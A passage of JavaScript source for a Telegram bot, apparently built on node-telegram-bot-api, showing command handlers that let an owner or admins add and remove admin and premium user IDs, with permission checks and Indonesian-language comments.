    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});
